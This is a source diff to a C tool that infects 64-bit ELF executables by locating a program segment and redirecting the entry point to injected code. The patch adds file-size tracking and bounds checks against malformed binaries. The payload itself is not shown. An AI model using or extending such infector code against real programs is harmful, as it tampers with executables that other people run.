@@ -46,10 +46,12 @@ static void bail(char const *prefix, char const *msg)
 }
 
 /* Map a file into read-write memory. The return value is a pointer to
- * the beginning of the file image. If utimbuf is not NULL, it receives
- * the file's current access and modification times.
+ * the beginning of the file image. If plen is not NULL, it receives
+ * the file's length. If utimbuf is not NULL, it receives the file's
+ * current access and modification times.
  */
-static void *mapfile(char const *filename, struct utimbuf *utimbuf)
+static void *mapfile(char const *filename, size_t *psize,
+		     struct utimbuf *utimbuf)
 {
     struct stat stat;
     void *ptr;
@@ -65,6 +67,8 @@ static void *mapfile(char const *filename, struct utimbuf *utimbuf)
     ptr = mmap(NULL, stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
     if (ptr == MAP_FAILED)
 	bail(filename, strerror(errno));
+    if (psize)
+	*psize = (size_t)stat.st_size;
     if (utimbuf) {
 	utimbuf->actime = stat.st_atime;
 	utimbuf->modtime = stat.st_mtime;
@@ -108,6 +112,7 @@ int main(int argc, char *argv[])
     Elf64_Ehdr *ehdr;
     Elf64_Phdr *phdr;
     Elf64_Off pos;
+    size_t filesize;
     char *image;
     int n;
 
@@ -118,7 +123,7 @@ int main(int argc, char *argv[])
     /* Load the file into memory and verify that it is a 64-bit ELF
      * executable.
      */
-    image = mapfile(filename, &timestamps);
+    image = mapfile(filename, &filesize, &timestamps);
     if (memcmp(image, ELFMAG, SELFMAG))
 	bail(filename, "not an ELF file.");
     if (image[EI_CLASS] != ELFCLASS64)
@@ -127,12 +132,23 @@ int main(int argc, char *argv[])
     if (ehdr->e_type != ET_EXEC)
 	bail(filename, "not an executable file.");
 
+    /* Try not to crash on a maliciously malformed binary.
+     */
+    if (ehdr->e_phoff <= 0 || ehdr->e_phnum <= 0)
+	bail(filename, "invalid ELF header.");
+    if (ehdr->e_phoff + ehdr->e_phnum * sizeof *phdr > filesize)
+	bail(filename, "invalid program segment header table.");
+
     /* Find a suitable location for our infection.
      */
     phdr = (Elf64_Phdr*)(image + ehdr->e_phoff);
     n = findinfectionphdr(phdr, ehdr->e_phnum);
     if (n < 0)
 	bail(filename, "unable to find a usable infection point");
+    if (phdr[n].p_offset + phdr[n].p_filesz >= filesize)
+	bail(filename, "invalid program segment in header table.");
+    if (phdr[n].p_filesz > 0x7FFFFFFF - sizeof infection)
+	bail(filename, "cannot infect a program segment >2GB.");
 
     /* Modify the executable's entry address to point to the chosen
      * location, and modify the infection program to jump to the
